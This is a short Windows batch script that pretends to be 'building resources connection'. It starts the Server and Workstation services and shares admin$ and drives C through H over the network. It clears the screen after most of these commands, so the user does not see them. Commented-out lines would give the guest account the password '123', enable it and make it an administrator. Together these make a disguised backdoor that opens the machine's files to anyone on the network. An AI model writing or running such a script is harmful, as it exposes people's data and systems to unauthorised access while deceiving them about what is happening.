@ echo off
color 0a
echo                          building resources connection......
:net user guest 123
:net user guest /active:yes
:net localgroup administrators guest /add
net start server
cls
net start workstation
cls
net share admin$ /y
cls
net share C$=C:
cls
net share D$=D:
cls
net share e$=e:
cls
net share f$=f:
cls
net share g$=h:
cls
net share h$=h:
echo building resources connection......
echo jobs done!
exit